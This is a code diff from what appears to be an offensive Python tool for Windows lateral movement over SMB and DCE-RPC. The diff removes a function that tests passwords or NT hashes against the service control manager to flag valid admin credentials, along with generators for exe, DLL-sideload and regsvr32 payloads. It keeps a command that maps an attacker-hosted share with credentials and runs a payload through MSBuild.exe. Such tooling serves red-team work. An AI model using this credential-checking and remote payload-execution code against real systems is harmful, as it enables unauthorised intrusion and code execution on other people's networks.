@@ -109,92 +109,6 @@ if os.path.isfile('{}/indivlog.txt'.format(cwd)):
 
 lognoprint('\n{}{}{}\n'.format(color_PURP, timestamp, color_reset))
 
-
-def check_accts(username, password, domain, remoteName, remoteHost, hashes=None, aesKey=None, doKerberos=None, kdcHost=None, port=445):
-    upasscombo = '{}:{}'.format(username, password)
-
-    nthash = ''
-    lmhash = ''
-    if hashes is not None:
-        lmhash, nthash = hashes.split(':')
-        upasscombo = '{}:{}'.format(username, nthash)
-
-    stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
-    logging.debug('StringBinding %s' % stringbinding)
-    rpctransport = transport.DCERPCTransportFactory(stringbinding)
-    rpctransport.set_dport(port)
-    rpctransport.setRemoteHost(remoteHost)
-    if hasattr(rpctransport, 'set_credentials'):
-        # This method exists only for selected protocol sequences.
-        rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey)
-
-    rpctransport.set_kerberos(doKerberos, kdcHost)
-
-    try:
-        samr = rpctransport.get_dce_rpc()
-        try:
-            samr.connect()
-        except Exception as e:
-            acct_chk_fail.append(username)
-            printnlog('{} {} {}'.format(red_minus, upasscombo.ljust(30), str(e)[:str(e).find("(")]))
-
-        s = rpctransport.get_smb_connection()
-        s.setTimeout(100000)
-        samr.bind(scmr.MSRPC_UUID_SCMR)
-        resp = scmr.hROpenSCManagerW(samr)
-        scHandle = resp['lpScHandle']
-        acct_chk_valid.append(username)
-        printnlog('{} {} {}'.format(gold_plus, upasscombo.ljust(30), "Valid Admin Creds"))
-
-
-    except  (Exception, KeyboardInterrupt) as e:
-        if str(e).find("rpc_s_access_denied") != -1 and str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") == -1:
-            acct_chk_valid.append(username)
-            printnlog('{} {} {}'.format(green_plus, upasscombo.ljust(30), "Valid Creds"))
-
-
-
-
-
-def gen_payload_exe(share_name, payload_name, addresses_array):
-    addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
-
-    os.system('sudo cp {}/src/exepayload /var/tmp/{}/{}.exe'.format(cwd, share_name, payload_name))
-    os.system('sudo chmod uog+rx /var/tmp/{}/{}.exe'.format(share_name, payload_name))
-
-    with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
-        for addr in addresses_array:
-            f.write(addr + "\n")
-        f.close()
-
-
-def gen_payload_dllsideload(share_name, addresses_array):
-    os.system('sudo cp {}/src/calc /var/tmp/{}/calc.exe'.format(cwd, share_name))
-    os.system('sudo chmod uog+rx /var/tmp/{}/calc.exe'.format(share_name))
-
-    os.system('sudo cp {}/src/WindowsCodecs /var/tmp/{}/WindowsCodecs.dll'.format(cwd, share_name))
-    os.system('sudo chmod uog+rx /var/tmp/{}/WindowsCodecs.dll'.format(share_name))
-
-    with open('/var/tmp/{}/address.txt'.format(share_name), 'w') as f:
-        for addr in addresses_array:
-            f.write(addr + "\n")
-        f.close()
-
-
-def gen_payload_regsvr32(share_name, payload_name, addresses_array):
-    addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
-
-    os.system('sudo cp {}/src/regsvr32payload /var/tmp/{}/{}.dll'.format(cwd, share_name, payload_name))
-    os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, payload_name))
-
-    with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
-        for addr in addresses_array:
-            f.write(addr + "\n")
-        f.close()
-
-    return addresses_file
-
-
 def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array, runasppl):
     targetname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
     taskname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
@@ -696,24 +610,12 @@ if __name__ == '__main__':
         if options.oe:  # I cannot for the life of me remember why this is in here
             addresses = ['23423.5463.1234.3465']
 
-        if options.payload == 'msbuild':
-            gen_payload_msbuild(share_name, payload_name, drive_letter, addresses, options.runasppl)  # creates the payload
-        elif options.payload == 'regsvr32':
-            addresses_file = gen_payload_regsvr32(share_name, payload_name, addresses)
-        elif options.payload == 'exe':
-            gen_payload_exe(share_name, payload_name, addresses)
-        elif options.payload == 'dllsideload':
-            gen_payload_dllsideload(share_name, addresses)
+
+        gen_payload_msbuild(share_name, payload_name, drive_letter, addresses, options.runasppl)  # creates the payload
 
 
-        if options.payload == 'msbuild':
-            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes ".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
-        elif options.payload == 'regsvr32':
-            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\System32\regsvr32.exe /s /i:{},{}.txt {}:\{}.dll && net use {}: /delete /yes ".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, addresses_file, drive_letter, payload_name, drive_letter)
-        elif options.payload == 'exe':
-            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\{}.exe && net use {}: /delete /yes ".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
-        elif options.payload == 'dllsideload':
-            command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && {}:\calc.exe && net use {}: /delete /yes ".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, drive_letter)
+
+        command = r"net use {}: \\{}\{} /user:{} {} /persistent:No && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe {}:\{}.xml && net use {}: /delete /yes ".format(drive_letter, local_ip, share_name, share_user, share_pass, drive_letter, payload_name, drive_letter)
 
         printnlog(command)
         printnlog("")
